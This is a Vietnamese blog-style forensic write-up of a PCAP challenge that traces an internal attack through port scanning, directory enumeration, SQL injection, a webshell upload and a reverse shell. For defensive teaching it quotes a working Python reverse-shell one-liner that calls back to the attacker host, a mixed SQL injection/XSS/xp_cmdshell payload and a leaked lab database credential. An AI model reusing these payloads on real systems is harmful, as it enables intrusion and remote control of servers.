---
title: "từ Local cho tới Reverse Shell"
date: 2026-07-26 07:00:00 +0700
categories: [Web, Reverse Shell]
tags: [Report, wireshark]
---
## Scenario

The SOC received an alert in their SIEM for ‘Local to Local Port Scanning’ where an internal private IP began scanning another internal system. Can you investigate and determine if this activity is malicious or not? You have been provided a PCAP, investigate using any tools you wish.

Wireshark đã capture được một cuộc tấn công để phân tích và làm rõ những điều này cần phải có những lưu ý sau, thứ nhất các cuộc tấn công có rất nhiều thể loại và rất nhiều điều xảy ra trên network chúng ta không thể nắm thóp hết được, nhưng để biết được đó là loại tấn công nào thì chúng ta phải thực hiện kiểm tra từng phần dù là nhỏ nhất trong cuộc tấn công đó, nó ảnh hưởng gì tới server hay mọi thứ của chúng ta hay không, với gợi ý trên là “Local to Local Port Scanning” điều này có thể cho thấy được rằng một user đã bị compromise và thực hiện active scanning port về máy chủ server. 

### Root Case

Nguồn gốc của điều này đã được xác định là xuất phát từ một máy nằm trong danh sách **local** và dưới đây chính là **conversation** của file pcap mà đã được capture.

![image.png](./assets/2026-07-26-network-analysts/1.png)

Điểm bất thường đã được xác định, có 2 IP có số lượng packet rất lớn và có lưu lượng bất thường so với những IP còn lại vậy nên sẽ thực hiện điều tra và phân tích hai IP để xác định được những gì đã xảy ra, sử dụng query dưới đây vào wireshark 

```jsx
ip.addr == 10.251.96.4 && ip.addr == 10.251.96.5
```

![image.png](./assets/2026-07-26-network-analysts/2.png)

Có hơn **15883** packet hiển thị, giao tiếp của hai IP này chiếm phần lớn packet trong file pcap này ngoài ra, từ hình ảnh trên xác định được IP **`10.251.96.4`** chính là IP bị compromise để thực hiện hành động **Scan Port** tới địa chỉ IP **`10.251.96.5`** và xác định được IP này chính là IP server. Quan sát được IP bị compromise đã sử dụng **`Nmap`** để thực hiện **Scan Port** các dấu hiệu và flag dưới đây chính là minh chứng và tôi còn biết rõ họ đã sử dụng option nào trong **`Nmap`** để thực hiện Scan

```jsx
**10.251.96.4 -> 10.251.96.5 SYN WIN=1024
10.251.96.5 -> 10.251.96.4 RST, ACK**  
```

Ở đây họ đã sử dụng option `-sS` trong `Nmap` để thực hiện Scan, còn phía tool thì Windown size đã chứng minh, có thể search internet để biết thêm chi tiết hơn, khi thực hiện scan mà được reply bằng hai flag RST và ACK thì điều đó có nghĩa là port đó đang đóng không còn để minh chứng về việc phát hiện cổng port nào mở thì xin mới mọi người xem dưới đây

![image.png](./assets/2026-07-26-network-analysts/3.png)

Dấu hiệu như sau và cũng giải thích cho mọi người dễ hiểu hơn về điều này

```jsx
**10.251.96.4 -> 10.251.96.5 SYN WIN=1024
10.251.96.5 -> 10.251.96.4 SYN, ACK port = 80**
```

Đó chính là những flag thiệt lập kết nối trên **Network** và nếu nó được open thì sẽ reply thành 2 flag điển hình của thiết lập connect đó chính là **SYN** và **ACK,** đây cũng chính là ROOT Cause cho cuộc attack này mà mình đã detect được. Attacker đã scan từ port 1-1024 để phát hiện xem có những cổng port nào được open và thật may mắn ch

### Phân Tích Diễn Biến

Nếu đã xác định được cổng port open, thì tiếp đến attacker sẽ thực hiện tấn công vào web server này, đây chính là điều chắc chắn vì dựa trên flow attack của attacker thì không phải dự đoán mà là nó sẽ chắc chắn xảy ra khi attacker detect được cổng port nào open thì họ sẽ thực hiện hoặc sử dụng tool để attack vào service đó. Điều gần như chắc chắn là attacker sẽ thực hiện scan resource của WEB server này và mình sẽ thực hiện anaylysts cũng như phát hiện thêm nhiều IOCs để take note lại.

Khi tiếp tục thực hiện phân tích và dự đoàn hành vi thì phát hiện được attacker đã sử dụng `gobuster` để thực hiện scan tài nguyên của web server này và họ đã thực hiện khá nhiều request tới web server để được phản hồi.
![image.png](./assets/2026-07-26-network-analysts/4.png)
Như có thể quan sát thấy được họ đã scan được rất nhiều directory hay còn gọi là folder có của web server, khi thực hiện scan thì phát hiện được web server này có một folder cho phép người dùng hoặc user được phép login vào hệ thống

![image.png](./assets/2026-07-26-network-analysts/5.png)

![image.png](./assets/2026-07-26-network-analysts/6.png)

Đó chính là `login.php` và những resource liên quan như `browse.php`, `complaint.php`, `editprofile.php`. Đó là những resource mà liên quan và quan trọng trong web server này vì nếu ở resource nào cho phép upload file từ user tới server thì sẽ có khả năng gây ra reverse. Bên cạnh đó họ còn sử dụng sqlmap để thực hiện `sql injection`, điều này nhằm thao túng server chứa data và thực hiện leak data nhạy cảm ra bên ngoài dưới đây chính là bằng chứng cho thấy họ thực hiện `sql injection`.

![image.png](./assets/2026-07-26-network-analysts/7.png)
![image.png](./assets/2026-07-26-network-analysts/8.png)
![image.png](./assets/2026-07-26-network-analysts/9.png)

Đó chính là những bằng chứng tố cáo họ đã thực hiện `SQL Injection` kèm theo đó dưới đây chính là payload của hình **số 9** mà

```
8454 AND 1=1
UNION ALL SELECT
    1,
    NULL,
    '<script>alert("XSS")</script>',
    table_name
FROM information_schema.tables
WHERE "1=1
-- ...
EXEC xp_cmdshell('cat ../../../etc/passwd')
#
```
Hơn nữa attacker đã thực hiện thành công nhưng chưa thế xác định được là injection thành công hay không mặc dù server đã trả về đúng những gì cần phải làm, ngoài ra chưa thể xác định được đã connect với database success hay chưa, dưới đây chính là bằng chứng cho thấy không thể connect tới được server database.
![image.png](./assets/2026-07-26-network-analysts/10.png)

Server đã tiết lộ cho attacker một thông tin quan trọng `root:bobthe@localhost`, đây có khả năng là fomart **user:password@domai**, chỉ là khả năng trong phỏng đoán thôi, nhưng đây cũng là một loại lỗ hổng **Information Disclosure** hay cụ thể hơn là rò rỉ cấu hình thông tin xác thực database.

Chưa thế xác định được attacker đã sử dụng thông tin mà được leak ra đó như thế nào nhưng tiếp với flow phân tích tiếp theo, chúng ta có bằng chứng attacker đã thực hiện upload file lên từ folder upload.php và dưới đây chính là bằng chứng cho thấy việc họ đã thực hiện upload

![image.png](./assets/2026-07-26-network-analysts/11.png)

Attacker đã thực hiện upload một file có tên là `dbfuctions.php` để thực hiện reverse shell và để chứng minh điều này dưới đây chính là bằng chứng cho thấy đây là chính một file mà dùng để thực hiện hành động nguy hiểm đó.

![image.png](./assets/2026-07-26-network-analysts/12.png)

Sừ dụng paterment *cmd* để thực hiện hành động `Reverse Shell` đặc biệt hơn nữa là chỉ có duy nhất 3 packet thực hiện điều này nhưng trong đó có một packet chứa payloads mà họ đã thực hiện dưới đây chính là payload đó.

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.251.96.4",4422));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
ở payload này nó sẽ tạo socket kết nối tới IP `10.251.96.4` với cổng port **4422** và thực hiệ mở **/bin/sh** với chế độ tương tác để attacker có thể connect được với server. Phân tích thêm một chút về payload này ```s.connect(...): server chủ động kết nối tới listener.
os.dup2(...,0): chuyển stdin vào socket.
os.dup2(...,1): chuyển stdout vào socket.
os.dup2(...,2): chuyển stderr vào socket.
/bin/sh -i: mở shell tương tác.```
một vài phân tích cơ bản về payload đó, không đào quá sâu nhưng đủ để hiểu hành động nó thực hiện khi payload được execute.


![image.png](./assets/2026-07-26-network-analysts/13.png)

Thấy được cổng port **4422** đã open từ attacker và connect thành công tới server, với gần 346 packet đã được truyền tải từ 2 bên và khả năng cao giao tiếp giữa hai IP này sẽ có nhiều nguy hiểm, tất cả ý trên chỉ là phỏng đoán nhưng thông thường thì điều này xảy ra là có khả năng, thực hiện kiểm tra attacker đã làm thực hiện được những hành động gì trên server thì tổng hợp như thế này, mặc dù reverse shell đã thành công từ bob-appserver (10.251.96.5) tới attacker (10.251.96.4) bằng cổng port **4422**, được thực thi dưới account có tên là `www-data` bên cạnh đó attacker cố gắng leo thang đặc quyền lên root nhưng bị thất bại
![image.png](./assets/2026-07-26-network-analysts/14.png)
ngoài ra attacker còn thực hiện hành động nhằm vào file `**dbfuncs.php**` và thực hiện hành động deleted nhưng không có **permission** để thực hiện điều này
![image.png](./assets/2026-07-26-network-analysts/15.png)
đó là những gì mà đặc biệt có trong **conversation** mà attacker đã thực hiện **Reverse Shell** kèm theo đó mặc dù không thực hiện được thành công leo thang nhưng đây cũng xem là một lỗ hổng trong cấu hình của server và điều này cực kì ảnh hưởng nghiêm trọng tới security của server nếu như không khắc phục sớm.

## Attack Flow của hacker

Dựa vào dữ liệu capture và phân tích trên, flow attack của hacker được tóm tắt như sau:

1. **Compromise and reconnaissance**
   - Hacker đã kiểm soát một máy trong mạng nội bộ: `10.251.96.4`
   - Từ máy này thực hiện **local port scan** tới server nội bộ `10.251.96.5`.
   - Scan được xác định là **Nmap SYN scan** (`-sS`) bằng các packet `SYN` và phản hồi `RST, ACK`/`SYN, ACK`.

2. **Port discovery**
   - Hacker scan các cổng từ `1-1024`.
   - Phát hiện cổng **80 mở**, xác định server là **web server**.

3. **Web application enumeration**
   - Dùng **Gobuster** quét thư mục và tài nguyên web server.
   - Phát hiện các resource quan trọng như `login.php`, `browse.php`, `complaint.php`, `editprofile.php`, `upload.php`.

4. **Application attack / SQL Injection**
   - Hacker sử dụng **sqlmap** để tấn công `login.php` hoặc các tham số liên quan.
   - Có bằng chứng payload SQL Injection và khả năng leak thông tin nhạy cảm.
   - Server trả về chuỗi nghi ngờ thông tin đăng nhập/DB: `root:bobthe@localhost`.

5. **File upload and webshell execution**
   - Hacker upload file `dbfuctions.php` thông qua `upload.php`.
   - File upload được sử dụng để tạo payload reverse shell.

6. **Reverse shell**
   - File webshell thực thi payload Python kết nối ngược tới `10.251.96.4:4422`.
   - Kết nối xảy ra từ server `10.251.96.5` tới attacker, mở `/bin/sh -i`.

7. **Post-exploitation**
   - Giao tiếp reverse shell tạo ra gần **346 packet** giữa hai IP.
   - Hacker hoạt động dưới tài khoản `www-data` trên server.
   - Có cố gắng **tăng quyền lên root** nhưng thất bại.
   - Cố gắng xóa `dbfuncs.php` cũng không thành công do thiếu quyền.

### Sơ đồ flow attack (tóm tắt)

`10.251.96.4 (compromised host)` → `Nmap SYN scan` → `10.251.96.5 (web server)` → `Gobuster directory discovery` → `SQL Injection attempt` → `Upload webshell (dbfuctions.php)` → `Reverse shell connect back to 10.251.96.4:4422` → `Post-exploitation activities`

Phần flow attack này giúp làm rõ trình tự hacker khai thác và những mốc quan trọng trong cuộc tấn công. Cần khuyến nghị khoá chặt các cổng không cần thiết, kiểm tra kỹ ứng dụng web và xử lý các lỗ hổng upload + SQLi. Đặc biệt hơn nữa là phải cần thận trong việc configuring của server, có thể open port hoặc những service cần thiết, nhưng về phần cấu hình phải cẩn thận hơn trong phần security, kèm theo đó về phần file upload thì hãy có scope của các định dạng cố định không phải file nào cũng có thể upload được được. Có thể không sát sao về việc security của web-server hay bất cứ service nào, nhưng khi điều gì hay lỗ hổng nào xuất hiện risk nào xảy ra thì hậu quả không thể lường trước được. 




